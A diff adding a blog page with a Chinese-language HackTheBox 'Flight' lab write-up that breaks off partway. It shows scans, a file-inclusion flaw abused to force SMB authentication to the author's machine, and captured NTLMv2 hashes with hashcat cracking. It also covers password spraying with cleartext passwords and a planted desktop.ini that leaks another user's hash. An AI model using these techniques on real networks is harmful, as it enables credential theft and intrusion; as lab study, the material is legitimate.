@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Nice one.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox_Flight">
+<meta property="og:url" content="https://yoloyolo.top/2023/03/12/HackTheBox-Flight/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="Nice one.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-12T05:35:08.000Z">
+<meta property="article:modified_time" content="2023-03-12T05:42:32.978Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2023/03/12/HackTheBox-Flight/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox_Flight | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2023/03/12/HackTheBox-Flight/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox_Flight
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-12 13:35:08 / Modified: 13:42:32" itemprop="dateCreated datePublished" datetime="2023-03-12T13:35:08+08:00">2023-03-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Nice one.</p>
+<a id="more"></a>
+<h1 id="hackthebox_flight"><a class="markdownIt-Anchor" href="#hackthebox_flight"></a> HackTheBox_Flight</h1>
+<h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2>
+<h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.187</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.187</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">80&#x2F;tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&#x2F;1.1.1m PHP&#x2F;8.1.1)</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-09 17:59:10Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  tcpwrapped</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;9%Time&#x3D;6409BDB7%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">Service Info: Host: G0; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3>
+<p>未枚举出路径</p>
+<h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.187/ | grep htb</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lf&quot;</span>&gt;</span>Copyright 2022 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>flight.htb<span class="tag">&lt;/<span class="name">a</span>&gt;</span> - All Rights Reserved<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到域名<code>flight.htb</code></p>
+<p>添加域名解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tflight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>枚举VHOST</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://flight.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.flight.htb&quot;</span> --hl 154</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000624:   200        90 L     412 W      3996 Ch     &quot;school&quot;</span><br></pre></td></tr></table></figure>
+<p>得到域名<code>school.flight.htb</code></p>
+<p>添加域名解析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tschool.flight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>LFI?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=index.php</span><br></pre></td></tr></table></figure>
+<p>HTML源码中得到index.php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ((strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;..&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(strtolower(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])),<span class="string">&#x27;filter&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;\\&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;htaccess&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;.shtml&#x27;</span>)!==<span class="literal">false</span>)</span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Suspicious Activity Blocked!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Incident will be reported&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]);	</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;C:\\xampp\\htdocs\\school.flight.htb\\home.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>SSRF发起SMB请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=//10.10.16.12/BFL</span><br></pre></td></tr></table></figure>
+<p>得到NTLMv2如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_apache::flight:d5bf8d2c6c495f7b:056EEC55DECB7A98AE95A4035C337D4A:010100000000000080156333C353D90175771A5F2C2A58F90000000002000800560050004D00430001001E00570049004E002D003300590036004E00470042005800320052005200370004003400570049004E002D003300590036004E0047004200580032005200520037002E00560050004D0043002E004C004F00430041004C0003001400560050004D0043002E004C004F00430041004C0005001400560050004D0043002E004C004F00430041004C000700080080156333C353D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure>
+<p>hashcat爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>得到密码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S@Ss!K@*t13</span><br></pre></td></tr></table></figure>
+<p>枚举SMB用户名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --users</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 2 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 1 desc: N</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 1 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: K</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: B</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: B</span><br></pre></td></tr></table></figure>
+<p>用户名列表如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat users</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O.Possum</span><br><span class="line">svc_apache</span><br><span class="line">V.Stevens</span><br><span class="line">D.Truff</span><br><span class="line">I.Francis</span><br><span class="line">W.Walker</span><br><span class="line">C.Bum</span><br><span class="line">M.Gold</span><br><span class="line">L.Kein</span><br><span class="line">G.Lors</span><br><span class="line">R.Cold</span><br><span class="line">S.Moon</span><br><span class="line">krbtgt</span><br><span class="line">Guest</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>
+<p>测试同密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u ./users -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --continue-on-success</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\S.Moon:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>
+<p>密码命中用户<code>S.Moon</code></p>
+<p>查看SMB路径权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u S.Moon -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445	Name: 10.10.11.187</span><br><span class="line">    Disk                                                Permissions		Comment</span><br><span class="line">	----                                                -----------		-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS		Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS		Default share</span><br><span class="line">	IPC$                                              	READ ONLY		Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY		Logon server share </span><br><span class="line">	Shared                                            	READ, WRITE</span><br><span class="line">	SYSVOL                                            	READ ONLY		Logon server share </span><br><span class="line">	Users                                             	READ ONLY</span><br><span class="line">	Web                                               	READ ONLY</span><br></pre></td></tr></table></figure>
+<p>错误方法</p>
+<p><s>嗨呀，smb分享路径写权限一眼psexec GetShell</s></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py flight.htb/S.Moon:<span class="string">&#x27;S@Ss!K@*t13&#x27;</span>@10.10.11.187</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting shares on 10.10.11.187.....</span><br><span class="line">[-] share &#39;ADMIN$&#39; is not writable.</span><br><span class="line">[-] share &#39;C$&#39; is not writable.</span><br><span class="line">[-] share &#39;NETLOGON&#39; is not writable.</span><br><span class="line">[*] Found writable share Shared</span><br><span class="line">[*] Uploading file gpbkeZsf.exe</span><br><span class="line">[-] Error uploading file gpbkeZsf.exe, aborting.....</span><br><span class="line">[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br></pre></td></tr></table></figure>
+<p><s>What the hell?</s></p>
+<p>正确方法</p>
+<p>监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure>
+<p>利用写权限上传desktop.ini用于触发SMB请求</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat desktop.ini</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource&#x3D;\\10.10.*.*\BFL</span><br></pre></td></tr></table></figure>
+<p>上传desktop.ini</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.187/shared -U S.Moon --password=<span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br><span class="line">put desktop.ini</span><br></pre></td></tr></table></figure>
+<p>得到NTLMv2如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.bum::flight.htb:e432c50eb3a75399:595CE71063742D2A3FCC6348F3B5782E:010100000000000000909C42D053D90114DEF6163CCF2D770000000002000800510051004E00460001001E00570049004E002D003800430051004900460035005800510038004C004B0004003400570049004E002D003800430051004900460035005800510038004C004B002E00510051004E0046002E004C004F00430041004C0003001400510051004E0046002E004C004F00430041004C0005001400510051004E0046002E004C004F00430041004C000700080000909C42D053D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure>
+<p>hashcat爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>得到明文如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tikkycoll_431012284</span><br></pre></td></tr></table></figure>
+<p>查看SMB路径权限</p>
